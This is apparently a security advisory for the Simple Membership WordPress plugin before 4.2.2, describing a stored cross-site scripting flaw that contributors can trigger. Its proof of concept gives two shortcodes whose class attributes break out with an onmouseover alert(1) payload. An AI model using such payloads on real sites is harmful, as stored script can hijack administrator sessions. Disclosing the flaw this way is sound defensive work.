## WordPress Plugin Vulnerabilities

# Simple Membership < 4.2.2 - Contributor+ Stored XSS

### Description

The plugin does not validate and escape some of its shortcode attributes before outputting them back in the page, which could allow users with a role as low as contributor to perform Stored Cross-Site Scripting attacks which could be used against high privilege users such as admin.

### Proof of Concept

1. Exploit shortcode:
[swpm\_paypal\_subscription\_cancel\_link merchant\_id='1' css\_class='" onmouseover="alert(1)"']
Note: The exploit requires a membership plugin user to log in.
2. Exploit shortcode:
[swpm\_payment\_button id='1' class='" onmouseover="alert(1)"']
Note: The “Braintree Buy Now” payment button uses the “class” parameter. You can add buttons on the "Payments" > "Manage Payment Buttons" page.
